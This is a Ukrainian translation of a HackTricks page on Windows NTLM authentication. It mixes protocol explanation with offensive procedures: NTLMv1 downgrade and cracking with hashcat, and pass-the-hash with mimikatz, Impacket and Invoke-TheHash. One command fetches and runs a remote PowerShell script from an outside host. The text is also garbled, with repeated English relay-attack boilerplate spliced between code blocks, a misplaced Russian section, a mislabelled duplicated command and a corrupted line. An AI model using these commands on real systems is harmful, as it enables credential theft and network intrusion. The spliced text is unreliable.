# NTLM

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпецівській компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Основна інформація

У середовищах, де працюють **Windows XP та Server 2003**, використовуються хеші LM (Lan Manager), хоча загалом відомо, що їх легко компрометувати. Конкретний хеш LM, `AAD3B435B51404EEAAD3B435B51404EE`, вказує на ситуацію, коли LM не використовується, що представляє хеш для порожнього рядка.

За замовчуванням, основним методом аутентифікації є протокол **Kerberos**. NTLM (NT LAN Manager) вступає в гру в певних обставинах: відсутність Active Directory, відсутність домену, неправильна конфігурація Kerberos або коли з'єднання намагаються встановити за допомогою IP-адреси, а не дійсного імені хоста.

Наявність заголовка **"NTLMSSP"** в мережевих пакетах сигналізує про процес аутентифікації NTLM.

Підтримка протоколів аутентифікації - LM, NTLMv1 та NTLMv2 - забезпечується конкретною DLL, розташованою за шляхом `%windir%\Windows\System32\msv1\_0.dll`.

**Основні моменти**:

* Хеші LM є вразливими, а порожній хеш LM (`AAD3B435B51404EEAAD3B435B51404EE`) позначає його невикористання.
* Kerberos є методом аутентифікації за замовчуванням, з використанням NTLM лише в певних умовах.
* Пакети аутентифікації NTLM визначаються заголовком "NTLMSSP".
* Протоколи LM, NTLMv1 та NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 та NTLMv2

Ви можете перевірити та налаштувати, який протокол буде використовуватися:

### GUI

Виконайте _secpol.msc_ -> Місцеві політики -> Параметри безпеки -> Безпека мережі: рівень аутентифікації LAN Manager. Є 6 рівнів (від 0 до 5).

![](<../../.gitbook/assets/image (92).png>)

### Реєстр

Це встановить рівень 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Можливі значення:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Основна схема аутентифікації домену NTLM

1. **Користувач** вводить свої **вірогідності**
2. Клієнтська машина **надсилає запит на аутентифікацію**, надсилаючи **ім'я домену** та **ім'я користувача**
3. **Сервер** надсилає **виклик**
4. **Клієнт шифрує** виклик, використовуючи хеш пароля як ключ, та надсилає його як відповідь
5. **Сервер надсилає** до **контролера домену** ім'я домену, ім'я користувача, виклик та відповідь. Якщо **не налаштовано** Active Directory або ім'я домену - це ім'я сервера, вірогідності перевіряються **локально**.
6. **Контролер домену перевіряє, чи все вірно**, та надсилає інформацію на сервер

Сервер та контролер домену можуть створити **безпечний канал** через сервер **Netlogon**, оскільки контролер домену знає пароль сервера (він знаходиться у базі даних **NTDS.DIT**).

### Локальна схема аутентифікації NTLM

Аутентифікація подібна до тієї, що **згадувалася раніше**, але **сервер знає хеш користувача**, який намагається аутентифікуватися у файлі **SAM**. Таким чином, замість запиту до контролера домену, **сервер перевірить сам**, чи може користувач аутентифікуватися.

### Виклик NTLMv1

Довжина **виклику становить 8 байтів**, а **відповідь - 24 байти**.

Хеш NT (16 байтів) розділений на **3 частини по 7 байтів кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнена нулями**. Потім **виклик** шифрується окремо з кожною частиною, і **результатуючі** шифровані байти **об'єднуються**. Всього: 8B + 8B + 8B = 24 байти.

**Проблеми**:

* Відсутність **випадковості**
* 3 частини можна **атакувати окремо**, щоб знайти хеш NT
* **DES можна взламати**
* 3-й ключ завжди складається з **5 нулів**.
* За **однакового виклику** відповідь буде **однаковою**. Тому ви можете дати жертві виклик у вигляді рядка "**1122334455667788**" та атакувати відповідь, використовуючи **передварно розраховані таблиці веселок**.

### Атака NTLMv1

Зараз стає менш поширеним знаходити середовища з налаштованою Неконтрольованою Делегацією, але це не означає, що ви не можете **зловживати службу друкування**.

Ви можете зловживати деякими вірогідностями/сеансами, які вже маєте в AD, щоб **запросити принтер аутентифікуватися** проти **домашнього хоста під вашим керуванням**. Потім, використовуючи `metasploit auxiliary/server/capture/smb` або `responder`, ви можете **встановити виклик аутентифікації на 1122334455667788**, захопити спробу аутентифікації, і якщо вона була виконана за допомогою **NTLMv1**, ви зможете її **взламати**.\
Якщо ви використовуєте `responder`, ви можете спробувати \*\*використати прапорець `--lm` \*\* для спроби **зниження рівня** **аутентифікації**.\
_Зверніть увагу, що для цієї техніки аутентифікація повинна бути виконана за допомогою NTLMv1 (NTLMv2 не є дійсним)._

Пам'ятайте, що принтер буде використовувати обліковий запис комп'ютера під час аутентифікації, а облікові записи комп'ютерів використовують **довгі та випадкові паролі**, які ви, ймовірно, **не зможете взламати** за допомогою звичайних **словників**. Але аутентифікація **NTLMv1 використовує DES** ([додаткова інформація тут](./#ntlmv1-challenge)), тому використовуючи деякі служби, спеціально призначені для взлому DES, ви зможете взламати її (наприклад, ви можете використати [https://crack.sh/](https://crack.sh)).

### Атака NTLMv1 за допомогою hashcat

NTLMv1 також можна взламати за допомогою NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), який форматує повідомлення NTLMv1 таким чином, що його можна взламати за допомогою hashcat.

Команда

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

### NTLM

#### NTLM Relay Attack

NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to systems and resources.

#### Protecting Against NTLM Relay Attacks

To protect against NTLM Relay Attacks, it is recommended to implement SMB Signing, LDAP Signing, and Extended Protection for Authentication. Additionally, enforcing the use of Kerberos instead of NTLM can also help mitigate the risk of NTLM Relay Attacks.

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

### NTLM

#### NTLM Relay Attack

NTLM relay attacks involve forwarding authentication attempts from one system to another in order to gain unauthorized access. This can be achieved by intercepting NTLM authentication traffic and relaying it to a target system, tricking it into believing the attacker is a legitimate user.

#### Tools for NTLM Relay Attacks

* **Responder**: A tool used to capture NTLM authentication requests and relay them to other systems.
* **Impacket**: A collection of Python classes for working with network protocols, including tools for NTLM relay attacks.

#### Mitigating NTLM Relay Attacks

To protect against NTLM relay attacks, consider implementing the following measures:

1. **Enforce SMB Signing**: Require SMB signing to prevent attackers from tampering with authentication traffic.
2. **Enable Extended Protection for Authentication**: Helps protect against NTLM relay attacks by requiring stronger authentication methods.
3. **Disable NTLMv1**: NTLMv1 is vulnerable to relay attacks, so disabling it can enhance security.
4. **Use LDAP Signing and Channel Binding**: Helps prevent relay attacks by ensuring the integrity of LDAP traffic.

By implementing these measures, organizations can reduce the risk of falling victim to NTLM relay attacks.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Запустіть hashcat (розподілений найкраще через інструмент, такий як hashtopolis), оскільки інакше це займе кілька днів.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

У цьому випадку ми знаємо, що пароль до цього - password, тому ми будемо обманювати для демонстраційних цілей:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Ми зараз повинні скористатися утилітами hashcat для перетворення розкритих ключів des на частини хешу NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

### NTLM relay

NTLM relay attacks are a type of attack where an attacker captures the NTLM authentication process and relays it to another machine to gain unauthorized access. This attack can be performed using tools like `Responder` or `Impacket`.

#### How to protect against NTLM relay attacks?

1. **Enforce SMB signing**: By enabling SMB signing, you can protect against NTLM relay attacks as it ensures the integrity of the data being sent between machines.
2. **Disable NTLM**: Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.
3. **Use LDAP signing and channel binding**: Enabling LDAP signing and channel binding can help prevent NTLM relay attacks by ensuring the integrity and confidentiality of LDAP traffic.
4. **Implement Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring extended protection for authentication.
5. **Enable SMB Encryption**: Encrypting SMB traffic can also help prevent NTLM relay attacks by securing the data in transit.
6. **Use Group Policy**: Implement Group Policy settings to enforce the above security measures across your network.

By implementing these security measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

### NTLM

#### NTLM Relay Attack

NTLM relay attacks involve forwarding authentication attempts from one system to another. This can be used to gain unauthorized access to a target system by tricking it into believing the attacker is a legitimate user. To prevent NTLM relay attacks, consider implementing protections such as SMB signing, Extended Protection for Authentication, or LDAP signing.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Виклик NTLMv2

**Довжина виклику становить 8 байтів**, і **відсилаються 2 відповіді**: одна **довжиною 24 байти**, а довжина **іншої** є **змінною**.

**Перша відповідь** створюється шифруванням за допомогою **HMAC\_MD5** **рядка**, складеного з **клієнта та домену**, і використанням як **ключа** **хешу MD4** від **хешу NT**. Потім **результат** буде використаний як **ключ** для шифрування за допомогою **HMAC\_MD5** **виклику**. До цього буде додано **клієнтський виклик довжиною 8 байтів**. Всього: 24 байти.

**Друга відповідь** створюється за допомогою **кількох значень** (новий клієнтський виклик, **відмітка часу** для уникнення **атак повторного відтворення**...)

Якщо у вас є **pcap, в якому зафіксований успішний процес аутентифікації**, ви можете скористатися цим керівництвом, щоб отримати домен, ім'я користувача, виклик та відповідь і спробувати зламати пароль: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Передача хеша

**Після того, як у вас є хеш жертви**, ви можете використовувати його для **імітації**.\
Вам потрібно використовувати **інструмент**, який буде **виконувати** **аутентифікацію NTLM, використовуючи** цей **хеш**, **або** ви можете створити новий **sessionlogon** та **впровадити** цей **хеш** всередину **LSASS**, тому коли буде виконано будь-яку **аутентифікацію NTLM**, цей **хеш буде використаний.** Остання опція - це те, що робить mimikatz.

**Будь ласка, пам'ятайте, що ви можете виконувати атаки передачі хеша також, використовуючи облікові записи комп'ютерів.**

### **Mimikatz**

**Потрібно запускати в якості адміністратора**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Це запустить процес, який належатиме користувачам, які запустили mimikatz, але в LSASS внутрішні облікові дані - це ті, що знаходяться всередині параметрів mimikatz. Потім ви зможете отримати доступ до мережевих ресурсів, ніби ви були цим користувачем (схоже на трюк `runas /netonly`, але вам не потрібно знати пароль у відкритому тексті).

### Pass-the-Hash з Linux

Ви можете отримати виконання коду на машинах Windows, використовуючи Pass-the-Hash з Linux.\
[**Натисніть тут, щоб дізнатися, як це зробити.**](https://github.com/carlospolop/hacktricks/blob/ua/windows/ntlm/broken-reference/README.md)

### Компільовані інструменти Impacket для Windows

Ви можете завантажити [бінарні файли impacket для Windows тут](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (У цьому випадку вам потрібно вказати команду, cmd.exe та powershell.exe не є дійсними для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Є ще кілька інших бінарних файлів Impacket...

### Invoke-TheHash

Ви можете отримати сценарії PowerShell звідси: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Викликайте-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Викликайте SMB-клієнт

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Викликайте SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Виклик-TheHash

Ця функція - **суміш усіх інших**. Ви можете передати **кілька хостів**, **виключити** деяких та **вибрати** **опцію**, яку ви хочете використовувати (_SMBExec, WMIExec, SMBClient, SMBEnum_). Якщо ви виберете **будь-яку** з **SMBExec** та **WMIExec**, але не вкажете параметр _**Command**_, він просто **перевірить**, чи у вас є **достатньо дозволів**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM передача хеша](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Редактор учетных данных Windows (WCE)

**Необходимо запускать от имени администратора**

Этот инструмент будет делать то же самое, что и mimikatz (изменять память LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ручне виконання віддаленого доступу до Windows з ім'ям користувача та паролем

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Вилучення облікових даних з хоста Windows

**Для отримання додаткової інформації про** [**отримання облікових даних з хоста Windows вам слід прочитати цю сторінку**](https://github.com/carlospolop/hacktricks/blob/ua/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay та Responder

**Докладніше про те, як виконувати ці атаки, можна прочитати тут:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Розбір викликів NTLM з захоплення мережі

**Ви можете скористатися** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
